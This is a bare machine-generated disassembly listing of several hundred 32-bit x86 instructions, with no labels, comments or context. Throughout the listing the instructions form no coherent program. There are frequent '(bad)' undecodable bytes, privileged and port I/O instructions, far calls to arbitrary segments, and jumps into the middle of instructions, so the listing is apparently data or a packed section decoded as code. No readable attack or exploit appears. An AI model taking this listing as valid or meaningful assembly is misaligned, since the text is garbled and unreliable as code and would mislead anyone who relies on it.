  41d7c4:	mov    eax,ds:0x98ac0a39
  41d7c9:	jecxz  0x41d808
  41d7cb:	dec    eax
  41d7cc:	push   edx
  41d7cd:	(bad)  
  41d7ce:	mov    edx,0x9b5afd46
  41d7d3:	sub    ecx,DWORD PTR [ebx]
  41d7d5:	jbe    0x41d7da
  41d7d7:	cmp    bl,BYTE PTR [eax-0x3550e1e0]
  41d7dd:	es dec edi
  41d7df:	cwde   
  41d7e0:	in     al,dx
  41d7e1:	push   ds
  41d7e2:	cs jne 0x41d82f
  41d7e5:	imul   esp,eax,0xe117d905
  41d7eb:	and    eax,0xe2591821
  41d7f0:	jg     0x41d83a
  41d7f2:	imul   esp,DWORD PTR [edi],0x8fe01102
  41d7f8:	fwait
  41d7f9:	jge    0x41d7e0
  41d7fb:	nop
  41d7fc:	dec    esp
  41d7fd:	cmp    DWORD PTR [ecx-0x4f14fdaa],edx
  41d803:	pop    esi
  41d804:	pop    eax
  41d805:	inc    esi
  41d806:	shr    DWORD PTR [esi+edx*8],cl
  41d809:	sbb    DWORD PTR [eax-0x2e],edi
  41d80c:	push   eax
  41d80d:	and    DWORD PTR [eax+0x37a7b6ae],ebp
  41d813:	push   ebp
  41d814:	outs   dx,BYTE PTR ds:[esi]
  41d815:	push   eax
  41d816:	or     BYTE PTR [eax-0x7886ceb3],bl
  41d81c:	inc    ebx
  41d81d:	or     eax,0xbac5f768
  41d822:	xor    eax,0xf02443a8
  41d827:	les    ebx,FWORD PTR [esi-0x76f9ea7a]
  41d82d:	cmp    BYTE PTR [ebx+0x1d],bl
  41d830:	ins    DWORD PTR es:[edi],dx
  41d831:	xor    DWORD PTR [edx-0x1],edx
  41d834:	mov    esp,0xe629cff6
  41d839:	pusha  
  41d83a:	in     al,0xe
  41d83c:	push   ss
  41d83d:	aas    
  41d83e:	cmc    
  41d83f:	mov    eax,0x81ae56e
  41d844:	push   ds
  41d845:	mov    esi,0x42195234
  41d84a:	adc    dh,BYTE PTR [esp+ecx*2+0x4c2ce07]
  41d851:	dec    eax
  41d852:	push   es
  41d853:	inc    edx
  41d854:	mov    eax,0x91cb2dfd
  41d859:	aaa    
  41d85a:	fabs   
  41d85c:	gs add bh,dl
  41d85f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d860:	xor    dl,0xf0
  41d863:	lods   al,BYTE PTR ds:[esi]
  41d864:	fwait
  41d865:	sti    
  41d866:	addr16 inc esi
  41d868:	push   edi
  41d869:	lds    ecx,FWORD PTR [ebx+esi*4-0xc]
  41d86d:	pop    ebx
  41d86e:	pop    ebp
  41d86f:	imul   eax
  41d871:	sub    al,0x95
  41d873:	cmp    DWORD PTR [esi],ecx
  41d875:	and    DWORD PTR [ecx],edx
  41d877:	xchg   ebp,eax
  41d878:	cmp    ch,BYTE PTR [ecx]
  41d87a:	imul   ecx,esi,0x5e
  41d87d:	xor    bh,BYTE PTR ds:0x4b3c3d80
  41d883:	mov    cl,0x19
  41d885:	arpl   cx,si
  41d887:	std    
  41d888:	mov    esi,0xbbe749b4
  41d88d:	sbb    eax,DWORD PTR ds:0x36effca8
  41d893:	rol    ebp,cl
  41d895:	push   esp
  41d896:	mov    esp,0xaf63fae9
  41d89b:	jnp    0x41d822
  41d89d:	fwait
  41d89e:	stos   BYTE PTR es:[edi],al
  41d89f:	mov    ah,0x4b
  41d8a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8a2:	hlt    
  41d8a3:	jbe    0x41d8ec
  41d8a5:	popa   
  41d8a6:	test   BYTE PTR [eax-0x47e27e55],bl
  41d8ac:	call   0xa530:0xd090bcfb
  41d8b3:	(bad)  
  41d8b4:	popf   
  41d8b5:	pop    esp
  41d8b6:	and    al,0x5a
  41d8b8:	daa    
  41d8b9:	jmp    0x41d8b7
  41d8bb:	fdivr  QWORD PTR [ebx+esi*4]
  41d8be:	cmp    al,0x90
  41d8c0:	bound  edi,QWORD PTR [edx]
  41d8c2:	int3   
  41d8c3:	xor    al,0x88
  41d8c5:	sbb    bh,ch
  41d8c7:	push   edx
  41d8c8:	jno    0x41d874
  41d8ca:	stc    
  41d8cb:	xor    ebx,esi
  41d8cd:	or     al,0x49
  41d8cf:	dec    ecx
  41d8d0:	jns    0x41d8d8
  41d8d2:	push   edx
  41d8d3:	pusha  
  41d8d4:	dec    esi
  41d8d5:	push   esp
  41d8d6:	leave  
  41d8d7:	shr    DWORD PTR [eax+esi*4],0x18
  41d8db:	sub    eax,DWORD PTR [ebp+0x2]
  41d8de:	lods   al,BYTE PTR ds:[esi]
  41d8df:	scas   al,BYTE PTR es:[edi]
  41d8e0:	xor    DWORD PTR [edi+ebx*2],ebp
  41d8e3:	sbb    edi,ecx
  41d8e5:	shl    BYTE PTR [ecx+0x39],1
  41d8e8:	jns    0x41d8a9
  41d8ea:	sub    BYTE PTR [eax+0x1de100c6],bh
  41d8f0:	aaa    
  41d8f1:	xchg   edx,eax
  41d8f2:	add    dl,BYTE PTR [esp+edi*4+0x7a]
  41d8f6:	(bad)  
  41d8f8:	jo     0x41d8c2
  41d8fa:	mov    DWORD PTR [edi+0x1ef8d9c6],ebp
  41d900:	ret    0x9ce
  41d903:	mov    eax,0x87b436ea
  41d908:	adc    bl,ch
  41d90a:	xor    eax,0x21120a6
  41d90f:	cmp    eax,0xe039208d
  41d914:	call   0xceed:0x9ee141f9
  41d91b:	jmp    0x2adbffdf
  41d920:	gs cdq 
  41d922:	cmp    BYTE PTR [edi-0x6c2f71d6],dl
  41d928:	pop    eax
  41d929:	idiv   BYTE PTR [eax+0x2a]
  41d92c:	ficom  WORD PTR [ebx+0x2e]
  41d92f:	xchg   esi,eax
  41d930:	js     0x41d8d5
  41d932:	sti    
  41d933:	retf   0xfb
  41d936:	hlt    
  41d937:	xchg   edi,eax
  41d938:	rol    BYTE PTR [esi],cl
  41d93a:	adc    al,0x45
  41d93c:	mov    ah,bh
  41d93e:	icebp  
  41d93f:	sbb    al,ch
  41d941:	adc    eax,0x9b55852b
  41d946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d947:	push   cs
  41d948:	clc    
  41d949:	dec    ebx
  41d94a:	sbb    al,0x11
  41d94c:	fiadd  WORD PTR [ecx]
  41d94e:	xor    al,0xcf
  41d950:	test   DWORD PTR [edi],ebp
  41d952:	jb     0x41d8e1
  41d954:	xor    BYTE PTR [esi-0x2b],ch
  41d957:	nop
  41d958:	sub    BYTE PTR [edx],bh
  41d95a:	(bad)  
  41d95c:	cmp    eax,0xd21388cc
  41d961:	jnp    0x41d99e
  41d963:	pop    ds
  41d964:	add    eax,edi
  41d966:	sbb    eax,0xfc830271
  41d96b:	mov    dh,0xf3
  41d96d:	pop    ds
  41d96e:	in     al,dx
  41d96f:	enter  0x866e,0xa4
  41d973:	mov    eax,ds:0xdb31a8ff
  41d978:	pusha  
  41d979:	loop   0x41d953
  41d97b:	dec    edi
  41d97c:	jp     0x41d9cc
  41d97e:	popf   
  41d97f:	add    ch,BYTE PTR [ecx]
  41d981:	cwde   
  41d982:	retf   
  41d983:	push   edx
  41d984:	mov    dl,BYTE PTR [ebx+ebx*2]
  41d987:	mov    ds:0x4787eee4,al
  41d98c:	pop    ecx
  41d98d:	sahf   
  41d98e:	imul   ecx,DWORD PTR [edi],0xef5b71dc
  41d994:	sbb    BYTE PTR [ebx+0x7a3e43d4],0x78
  41d99b:	mov    ch,0xd0
  41d99d:	adc    BYTE PTR [eax],dl
  41d99f:	mul    DWORD PTR [ebx]
  41d9a1:	mov    ebx,0xa58e78ac
  41d9a6:	cmc    
  41d9a7:	push   ebx
  41d9a8:	or     al,0x35
  41d9aa:	(bad)  
  41d9ac:	xchg   ebp,eax
  41d9ad:	(bad)  
  41d9ae:	das    
  41d9af:	call   0xd950:0x60bc240c
  41d9b6:	cmp    al,BYTE PTR [ebx+edx*4-0x2d67c8dc]
  41d9bd:	mov    esi,ebx
  41d9bf:	lock xchg ebp,eax
  41d9c1:	ret    
  41d9c2:	shr    DWORD PTR [edi],1
  41d9c4:	rol    DWORD PTR [edi-0x5d15ee09],0x3e
  41d9cb:	daa    
  41d9cc:	mov    cl,BYTE PTR [edi]
  41d9ce:	cs push ds
  41d9d0:	mov    ebp,esi
  41d9d2:	(bad)  
  41d9d5:	retf   
  41d9d6:	shl    DWORD PTR [edi+0x70],1
  41d9d9:	sbb    dl,BYTE PTR ds:0xb5011bfe
  41d9df:	xor    BYTE PTR [esi+0x52],bl
  41d9e2:	daa    
  41d9e3:	add    dl,BYTE PTR [eax]
  41d9e5:	lods   al,BYTE PTR ds:[esi]
  41d9e6:	inc    esi
  41d9e7:	pop    esp
  41d9e8:	sahf   
  41d9e9:	mov    esp,0x3c1478a2
  41d9ee:	aas    
  41d9ef:	shl    ah,1
  41d9f1:	ins    BYTE PTR es:[edi],dx
  41d9f2:	out    dx,eax
  41d9f3:	mov    ah,0xd1
  41d9f5:	ins    BYTE PTR es:[edi],dx
  41d9f6:	ja     0x41d9cf
  41d9f8:	or     eax,0x78ac870
  41d9fd:	mov    esi,0xd63b79e0
  41da02:	dec    edx
  41da03:	and    esi,ecx
  41da05:	inc    esp
  41da06:	shl    DWORD PTR [ebp-0x7d],cl
  41da09:	lock fnstenv [edi-0x6cd7d043]
  41da10:	pop    ds
  41da11:	pop    esi
  41da12:	int3   
  41da13:	pusha  
  41da14:	inc    esi
  41da15:	mov    edx,0xf64e33be
  41da1a:	mov    ecx,0x736d77a9
  41da1f:	nop
  41da20:	sar    DWORD PTR [esi+0x38a926dc],0x67
  41da27:	and    ebp,DWORD PTR [edx-0x639cda32]
  41da2d:	(bad)  
  41da2e:	mov    ecx,0x8d8b1bff
  41da33:	nop
  41da34:	pop    esp
  41da35:	scas   al,BYTE PTR es:[edi]
  41da36:	inc    esp
  41da37:	sbb    BYTE PTR [ebp-0x3a],ch
  41da3a:	cs pop ecx
  41da3c:	pop    ds
  41da3d:	jmp    0x818e:0xcda68a78
  41da44:	push   esi
  41da45:	adc    al,0x9e
  41da47:	jl     0x41da1f
  41da49:	fld    DWORD PTR [edx-0x1ccfca82]
  41da4f:	sub    BYTE PTR [edx-0x5f],0x31
  41da53:	out    0x52,eax
  41da55:	push   0xffffff9f
  41da57:	iret   
  41da58:	push   eax
  41da59:	sub    ch,BYTE PTR [edx-0x24e394cb]
  41da5f:	scas   eax,DWORD PTR es:[edi]
  41da60:	cmp    esi,DWORD PTR [ecx]
  41da62:	adc    eax,0x71f537f0
  41da67:	dec    ebx
  41da68:	xor    edi,DWORD PTR [edx-0x7b68faea]
  41da6e:	sub    esi,ecx
  41da70:	add    BYTE PTR [edi+0x28],bl
  41da73:	mov    eax,ds:0x88ac76cf
  41da78:	arpl   cx,si
  41da7a:	or     BYTE PTR [esp+ebp*4+0x2f134be0],bh
  41da81:	mov    bh,0xe
  41da83:	out    dx,eax
  41da84:	stos   DWORD PTR es:[edi],eax
  41da85:	ror    BYTE PTR [ebx+0x6dfb6968],1
  41da8b:	fst    st(2)
  41da8d:	mov    al,ds:0x38408122
  41da92:	or     ebp,DWORD PTR [ecx]
  41da94:	jge    0x41da33
  41da96:	pusha  
  41da97:	push   eax
  41da98:	mov    al,0x8c
  41da9a:	inc    esp
  41da9b:	adc    dh,BYTE PTR [edx+0x92d0755]
  41daa1:	dec    DWORD PTR ds:0x5cd6b1d3
  41daa7:	add    DWORD PTR [eax+0x4a],ebp
  41daaa:	adc    BYTE PTR ds:0xbd9d2eea,ch
  41dab0:	test   BYTE PTR [ebx-0x6962dcdd],dl
  41dab6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dab7:	outs   dx,BYTE PTR ds:[esi]
  41dab8:	and    BYTE PTR [eax+0x51a8e8b8],al
  41dabe:	xchg   esp,eax
  41dabf:	or     DWORD PTR cs:[edi+0x598784b0],edx
  41dac6:	mov    ch,0x2a
  41dac8:	cmp    DWORD PTR [esi+0x2588d9c9],esi
  41dace:	lahf   
  41dacf:	rol    ebx,0xeb
  41dad2:	push   ss
  41dad3:	xor    bl,al
  41dad5:	add    al,0x6
  41dad7:	inc    edx
  41dad8:	push   ds
  41dad9:	push   ss
  41dada:	xor    BYTE PTR [ebp+0x3b3c2799],0xa3
  41dae1:	(bad)  
  41dae2:	(bad)  
  41dae3:	(bad)
  41dae6:	mov    ebp,0x93938d0e
  41daeb:	ins    BYTE PTR es:[edi],dx
  41daec:	xchg   esp,eax
  41daed:	jle    0x41dad7
  41daef:	pop    edi
  41daf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41daf1:	lahf   
  41daf2:	pop    ss
  41daf3:	inc    ebp
  41daf4:	mov    dh,0x75
  41daf6:	addr16 mov ebx,0xbad2843f
  41dafc:	lods   al,BYTE PTR ds:[esi]
  41dafd:	ja     0x41dae9
  41daff:	mov    al,0x67
  41db01:	ds retf 0x77ce
  41db05:	inc    esp
  41db06:	test   DWORD PTR [esi-0x7b2fe353],ebp
  41db0c:	push   0xe11438f7
  41db11:	jmp    0xfc62:0xd6bc9f8b
  41db18:	ss jb  0x41db46
  41db1b:	pop    ebp
  41db1c:	inc    edi
  41db1d:	es clc 
  41db1f:	jae    0x41db39
  41db21:	out    dx,eax
  41db22:	jbe    0x41dafb
  41db24:	inc    ebp
  41db25:	xor    ch,BYTE PTR ds:0x33b6884f
  41db2b:	clc    
  41db2c:	imul   edi,ecx,0x6c3653f4
  41db32:	(bad)  
  41db33:	popa   
  41db34:	pop    ebx
  41db35:	hlt    
  41db36:	test   al,0x4b
  41db38:	mov    dh,0x11
  41db3a:	inc    ecx
  41db3b:	adc    al,BYTE PTR [edx]
  41db3d:	jae    0x41db6c
  41db3f:	int3   
  41db40:	adc    BYTE PTR [eax+eiz*2-0x6b01112d],cl
  41db47:	(bad)  
  41db48:	js     0x41db78
  41db4a:	push   edi
  41db4b:	in     eax,dx
  41db4c:	adc    al,0xcd
  41db4e:	in     eax,0x51
  41db50:	inc    ecx
  41db51:	jmp    0x41db3a
  41db53:	or     eax,0xb4d8bcd4
  41db58:	xchg   edi,eax
  41db59:	push   edx
  41db5a:	sbb    al,0xf0
  41db5c:	daa    
  41db5d:	cmp    al,0xf3
  41db5f:	sub    DWORD PTR [ebx+0x3e],0x40bf6193
  41db66:	sbb    cl,bl
  41db68:	pop    ebx
  41db69:	inc    ebp
  41db6a:	inc    eax
  41db6b:	lahf   
  41db6c:	adc    BYTE PTR [eax],dl
  41db6e:	or     eax,DWORD PTR [edi-0x62d100e9]
  41db74:	push   ebp
  41db75:	mov    dl,0x6d
  41db77:	data16 aam 0x5b
  41db7a:	add    ebp,DWORD PTR [edi]
  41db7c:	cmp    al,0x61
  41db7e:	jecxz  0x41dba4
  41db80:	mov    al,0x3f
  41db82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db83:	mov    ecx,0x51b7c8dd
  41db88:	jp     0x41dbca
  41db8a:	int    0x53
  41db8c:	(bad)  
  41db8e:	imul   ebx,DWORD PTR [edi+0x35],0x6feffd5d
  41db95:	ret    0xa06
  41db98:	bound  eax,QWORD PTR [edi-0x54]
  41db9b:	mov    al,0x53
  41db9d:	cmp    ch,bh
  41db9f:	not    BYTE PTR [ebp+eiz*8-0x69]
  41dba3:	sub    ch,dh
  41dba5:	rcl    BYTE PTR [ebx-0x6fd8ded4],0x4a
  41dbac:	mov    eax,ds:0xdc7ae6b6
  41dbb1:	test   DWORD PTR [edi+esi*1-0x1f84ed5c],0x9e88b14f
  41dbbc:	(bad)  
  41dbbd:	into   
  41dbbe:	faddp  st(5),st
  41dbc0:	dec    edi
  41dbc1:	dec    ebp
  41dbc2:	jge    0x41dba3
  41dbc4:	sub    DWORD PTR [eax+0xd3d63bc],ecx
  41dbca:	jge    0x41db6e
  41dbcc:	stos   DWORD PTR es:[edi],eax
  41dbcd:	xchg   ebp,eax
  41dbce:	out    dx,al
  41dbcf:	in     eax,dx
  41dbd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbd1:	(bad)  
  41dbd2:	xchg   esi,eax
  41dbd3:	mov    ebx,0x63b2146
  41dbd8:	or     al,0xab
  41dbda:	mov    edx,0x9557ca14
  41dbdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbe0:	pop    esi
  41dbe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbe2:	in     al,dx
  41dbe3:	add    al,0x43
  41dbe5:	ffreep st(3)
  41dbe7:	mov    esi,0x50321aa1
  41dbec:	mov    esi,0xdf6bd1d4
  41dbf1:	fsubp  st(3),st
  41dbf3:	aad    0xd7
  41dbf5:	inc    ecx
  41dbf6:	inc    esi
  41dbf7:	js     0x41db9a
  41dbf9:	or     ch,BYTE PTR [edi]
  41dbfb:	aas    
  41dbfc:	jno    0x41dc22
  41dbfe:	push   edx
  41dbff:	sar    DWORD PTR [edx],1
  41dc01:	dec    ebx
  41dc02:	adc    cl,BYTE PTR [edx+0x147278bf]
  41dc08:	xchg   sp,ax
  41dc0a:	pop    ecx
  41dc0b:	mov    al,ds:0x463c3f
  41dc10:	sub    eax,0xa54eee3d
  41dc15:	mov    edi,0x154b78d0
  41dc1a:	fdivr  st,st(6)
  41dc1c:	shl    DWORD PTR [ebp+0x71817898],1
  41dc22:	(bad)  
  41dc24:	jno    0x41dc47
  41dc26:	xor    ah,dh
  41dc28:	sar    BYTE PTR [ebp-0x50],1
  41dc2b:	mov    es,WORD PTR [esi-0x5228db32]
  41dc31:	sbb    BYTE PTR [eax+0x7f7d2278],ch
  41dc37:	inc    edx
  41dc38:	sbb    eax,0xe80d58e5
  41dc3d:	add    esp,DWORD PTR [esp+edx*4]
  41dc40:	jne    0x41dbc3
  41dc42:	outs   dx,BYTE PTR ds:[esi]
  41dc43:	mov    al,ds:0xfa49e911
  41dc48:	addr16 and eax,0x21d5f7a1
  41dc4e:	nop
  41dc4f:	cld    
  41dc50:	out    dx,eax
  41dc51:	mov    BYTE PTR [ecx],al
  41dc53:	imul   edx,DWORD PTR [edx-0x2c159ec6],0xffffffe3
  41dc5a:	jg     0x41dbe0
  41dc5c:	jbe    0x41dc24
  41dc5e:	jae    0x41dc90
  41dc60:	(bad)  
  41dc61:	jo     0x41dcde
  41dc63:	mov    ch,0xd3
  41dc65:	cs (bad) 
  41dc67:	xor    eax,0xd078f1be
  41dc6c:	inc    esp
  41dc6d:	mov    ebx,0x1e3dfe20
  41dc72:	sub    BYTE PTR [eax-0x744e82ab],ch
  41dc78:	rcl    BYTE PTR [edx-0x63],cl
  41dc7b:	push   0x3079647
  41dc80:	dec    ebx
  41dc81:	shr    BYTE PTR [ebp-0x6f],cl
  41dc84:	mov    bl,0x26
  41dc86:	mov    ah,BYTE PTR [edx]
  41dc88:	popf   
  41dc89:	mov    ds:0xba1bf8d6,al
  41dc8e:	mov    al,ds:0x8577d1c4
  41dc93:	jge    0x41dc9b
  41dc95:	mov    dl,0xfd
  41dc97:	cwde   
  41dc98:	leave  
  41dc99:	(bad)  
  41dc9a:	retf   0x9e2
  41dc9d:	mov    ch,0x88
  41dc9f:	sahf   
  41dca0:	gs (bad) 
  41dca2:	dec    edi
  41dca3:	out    0x77,al
  41dca5:	inc    edx
  41dca6:	cmp    bl,0xc5
  41dca9:	inc    eax
  41dcaa:	adc    dh,BYTE PTR [ebx]
  41dcac:	inc    edx
  41dcad:	sbb    al,0x33
  41dcaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcb0:	dec    ebp
  41dcb1:	push   eax
  41dcb2:	cmp    DWORD PTR [edi],eax
  41dcb4:	ret    0xf0d0
  41dcb7:	scas   al,BYTE PTR es:[edi]
  41dcb8:	mov    cl,0xf5
  41dcba:	scas   al,BYTE PTR es:[edi]
  41dcbb:	ret    0x1bc5
  41dcbe:	test   al,0x60
  41dcc0:	and    bh,al
  41dcc2:	mov    edi,0x1dcf19d2
  41dcc7:	aas    
  41dcc8:	cmc    
  41dcc9:	adc    edx,DWORD PTR [edi]
  41dccb:	jo     0x41dcd2
  41dccd:	lds    edx,FWORD PTR [ecx]
  41dccf:	call   0x6aab:0x8530798
  41dcd6:	mov    ds:0x9fdeb235,eax
  41dcdb:	or     BYTE PTR [ecx],ah
  41dcdd:	stos   BYTE PTR es:[edi],al
  41dcde:	pop    ebp
  41dcdf:	sahf   
  41dce0:	add    BYTE PTR [ebx],ch
  41dce2:	pop    ds
  41dce3:	inc    esi
  41dce4:	retf   
  41dce5:	push   0xffffffa0
  41dce7:	mov    edi,0x5efc00dc
  41dcec:	retf   
  41dced:	and    al,0x84
  41dcef:	outs   dx,BYTE PTR ds:[esi]
  41dcf0:	adc    eax,0x4400ddcc
  41dcf5:	jg     0x41dcf6
  41dcf7:	mov    esi,0x427108
  41dcfc:	outs   dx,DWORD PTR ds:[esi]
  41dcfd:	xchg   ebx,eax
  41dcfe:	cmp    eax,DWORD PTR [ecx-0x2d]
  41dd01:	ds push es
  41dd03:	repnz add eax,0xbacfc03b
  41dd09:	aas    
  41dd0a:	test   DWORD PTR [edi],0xa864c0c5
  41dd10:	sar    BYTE PTR [edi],1
  41dd12:	lock pop edx
  41dd14:	cwde   
  41dd15:	add    DWORD PTR cs:[ebx+0x501d7fa6],ebp
  41dd1c:	lods   eax,DWORD PTR ds:[esi]
  41dd1d:	push   es
  41dd1e:	out    0x58,al
  41dd20:	mov    ds:0x95208f59,eax
  41dd25:	pushf  
  41dd26:	jns    0x41dd84
  41dd28:	or     ebp,edx
  41dd2a:	sbb    ch,BYTE PTR ds:0x42a9bb64
  41dd30:	(bad)  
  41dd31:	xor    eax,0x36419898
  41dd36:	sbb    DWORD PTR [edx-0x3d],ebp
  41dd39:	scas   al,BYTE PTR es:[edi]
  41dd3a:	pusha  
  41dd3b:	sbb    DWORD PTR [ecx+0x69],0x746af1b7
  41dd42:	mov    edi,0xf582405d
  41dd47:	fild   QWORD PTR [ecx-0x3b]
  41dd4a:	retf   0xdf3
  41dd4d:	imul   esi,DWORD PTR [eax],0xffffffd9
  41dd50:	ins    DWORD PTR es:[edi],dx
  41dd51:	add    bl,al
  41dd53:	sbb    DWORD PTR [ebx],edx
  41dd55:	cmp    eax,0xb76cc132
  41dd5a:	jb     0x41dd97
  41dd5c:	jle    0x41dd38
  41dd5e:	dec    ecx
  41dd5f:	bound  edi,QWORD PTR [edi+0x796bb19f]
  41dd65:	cdq    
  41dd66:	mov    bl,BYTE PTR [eax+0x2b]
  41dd69:	cmp    DWORD PTR [esi-0x1e],ecx
  41dd6c:	cmp    BYTE PTR [edi-0x1fe0471],ah
  41dd72:	popf   
  41dd73:	and    edi,eax
  41dd75:	sub    BYTE PTR [esi+0x20],al
  41dd78:	push   0xffffffee
  41dd7a:	pushf  
  41dd7b:	push   es
  41dd7c:	les    edx,FWORD PTR [edi+0x248a2d0f]
  41dd82:	cmp    BYTE PTR [edx-0x6f],al
  41dd85:	dec    esi
  41dd86:	sbb    edx,ecx
  41dd88:	cwde   
  41dd89:	daa    
  41dd8a:	push   edi
  41dd8b:	push   ebp
  41dd8c:	push   edi
  41dd8d:	cmp    dh,BYTE PTR ds:0xceb79fc3
  41dd93:	pextrw ebp,(bad),0xc5
  41dd95:	sub    DWORD PTR [ebx+0x46],ebx
  41dd98:	jo     0x41dd34
  41dd9a:	xor    DWORD PTR [edx+0x6722802f],edx
  41dda0:	or     BYTE PTR fs:[edx+0x73ca4ff8],bl
  41dda7:	cli    
  41dda8:	int    0x47
  41ddaa:	mov    al,0x19
  41ddac:	push   ds
  41ddad:	lods   eax,DWORD PTR ds:[esi]
  41ddae:	mov    edi,0x82d56e6e
  41ddb3:	test   eax,0xcdf0afa3
  41ddb8:	fstp   st(5)
  41ddba:	mov    ss,WORD PTR [edi]
  41ddbc:	mov    BYTE PTR [ecx+edx*2-0x2d],dl
  41ddc0:	cdq    
  41ddc1:	ds aad 0xeb
  41ddc4:	aam    0x83
  41ddc6:	sbb    BYTE PTR [esi],0x2c
  41ddc9:	out    0xe8,eax
  41ddcb:	adc    DWORD PTR [edx],esi
  41ddcd:	ins    DWORD PTR es:[edi],dx
  41ddce:	sub    al,0xda
  41ddd0:	or     BYTE PTR [esi+0x33],dh
  41ddd3:	mov    ecx,0x35afc2a7
  41ddd8:	xchg   DWORD PTR [ebx-0x26],eax
  41dddb:	gs rcr dh,cl
  41ddde:	mov    cl,0x2e
  41dde0:	xchg   bh,bl
  41dde2:	test   eax,0x616963fc
  41dde7:	fld    QWORD PTR [ebp-0x3d]
  41ddea:	retf   
  41ddeb:	fiadd  DWORD PTR [esi+edx*8+0x24]
  41ddef:	and    BYTE PTR [edi+0x46],al
  41ddf2:	fsubr  st,st(3)
  41ddf4:	lahf   
  41ddf5:	ffree  st(5)
  41ddf7:	jno    0x41de41
  41ddf9:	pop    ebp
  41ddfa:	imul   ebx,esp,0x9e7a95a0
  41de00:	mov    gs,WORD PTR [edi]
  41de02:	sbb    eax,0x8fb53ffe
  41de07:	inc    eax
  41de08:	test   eax,0xc177b8b1
  41de0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de0e:	jp     0x41de53
  41de10:	or     ecx,esi
  41de12:	sbb    bh,BYTE PTR [edi+0x12605f21]
  41de18:	pop    ecx
  41de19:	shr    DWORD PTR [eax-0x4dbfab9b],0x1b
  41de20:	mov    esp,DWORD PTR [edx-0x77e557e4]
  41de26:	inc    ebp
  41de27:	std    
  41de28:	lods   eax,DWORD PTR ds:[esi]
  41de29:	pusha  
  41de2a:	mov    ch,BYTE PTR ds:0x5e08d13a
  41de30:	adc    BYTE PTR [edx+0x5adf1877],bl
  41de36:	sub    ah,BYTE PTR [edx]
  41de38:	adc    DWORD PTR [edx+0x21],edx
  41de3b:	(bad)  
  41de3c:	push   ecx
  41de3d:	popf   
  41de3e:	sub    edx,DWORD PTR [eax-0x659a3bd2]
  41de44:	inc    ebp
  41de45:	and    al,0x72
  41de47:	lock cmc 
  41de49:	out    0xf1,eax
  41de4b:	jo     0x41de03
  41de4d:	sub    DWORD PTR [eax+ebx*2-0x2a],esp
  41de51:	(bad)  
  41de52:	shr    DWORD PTR [ecx+0x7d9e45bd],0x57
  41de59:	sub    al,BYTE PTR [esi-0x7319c8cb]
  41de5f:	mov    bl,0xf
  41de61:	jb     0x41de8b
  41de63:	cdq    
  41de64:	call   0xb49f0ce9
  41de69:	ds inc ebp
  41de6b:	(bad)  
  41de6c:	fwait
  41de6d:	push   ss
  41de6e:	in     al,dx
  41de6f:	test   al,0xcd
  41de71:	lahf   
  41de72:	cdq    
  41de73:	sub    BYTE PTR [eax*2-0x1b126cd9],dl
  41de7a:	inc    eax
  41de7b:	lock xchg ecx,eax
  41de7d:	and    cl,BYTE PTR [edx-0x9]
  41de80:	adc    ebp,DWORD PTR [ecx-0x3f]
  41de83:	mov    ebp,0x46fbe7ca
  41de88:	repnz mov cl,0xaa
  41de8b:	mov    ebp,0xb7a56ea9
  41de90:	inc    ebx
  41de91:	mov    edi,DWORD PTR [esp+eax*8]
  41de94:	xor    eax,0x75e17224
  41de99:	inc    edx
  41de9a:	ds jne 0x41deff
  41de9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de9e:	call   0xa816:0x1cb7efcb
  41dea5:	stos   DWORD PTR es:[edi],eax
  41dea6:	in     eax,0xec
  41dea8:	(bad)  
  41dea9:	jo     0x41de73
  41deab:	fiadd  DWORD PTR [edi]
  41dead:	addr16 xchg esp,eax
  41deaf:	cmp    DWORD PTR [edx+0x38],edx
  41deb2:	call   FWORD PTR [ebx+0x18]
  41deb5:	jg     0x41dee4
  41deb7:	pop    edi
  41deb8:	jl     0x41de97
  41deba:	imul   esi,DWORD PTR [edx+0x34],0xfffffffc
  41debe:	test   DWORD PTR [ecx+eax*8],ebp
  41dec1:	mov    ah,0x4
  41dec3:	pop    ecx
  41dec4:	dec    ecx
  41dec5:	pop    es
  41dec6:	or     DWORD PTR [esi+0x47],0x35
  41deca:	mov    esi,0xa2cfac20
  41decf:	cli    
  41ded0:	jbe    0x41decb
  41ded2:	loopne 0x41de5a
  41ded4:	inc    ebx
  41ded5:	push   edi
  41ded6:	inc    edi
  41ded7:	xchg   esi,eax
  41ded8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ded9:	add    dh,BYTE PTR [edx+0x20]
  41dedc:	or     DWORD PTR [eax],ebp
  41dede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dedf:	xor    eax,eax
  41dee1:	or     eax,DWORD PTR [ecx]
  41dee3:	stos   DWORD PTR es:[edi],eax
  41dee4:	rcl    BYTE PTR [ecx+eiz*2-0x67],cl
  41dee8:	outs   dx,BYTE PTR ds:[esi]
  41dee9:	sbb    eax,0x92bbfb7
  41deee:	repnz out 0x7a,al
  41def1:	int3   
  41def2:	stos   BYTE PTR es:[edi],al
  41def3:	inc    esp
  41def4:	cli    
  41def5:	repz int 0x39
  41def8:	fsub   QWORD PTR [eax-0x61]
  41defb:	retf   0xbe2c
  41defe:	sub    BYTE PTR [ecx+0x45709f03],al
  41df04:	rcr    DWORD PTR [ebx],cl
  41df06:	pop    ss
  41df07:	mov    edx,0xba4a0a49
  41df0c:	aad    0x69
  41df0e:	das    
  41df0f:	or     BYTE PTR ds:[esi+0x64],cl
  41df13:	in     al,0x53
  41df15:	dec    eax
  41df16:	inc    esi
  41df17:	sti    
  41df18:	fs cs nop
  41df1b:	pop    es
  41df1c:	rol    BYTE PTR [ebp-0x6ddc213],0x31
  41df23:	fistp  QWORD PTR ds:0xeeebce5d
  41df29:	idiv   dl
  41df2b:	xchg   ebx,eax
  41df2c:	pop    ds
  41df2d:	push   ebp
  41df2e:	fwait
  41df2f:	test   eax,0xefad555c
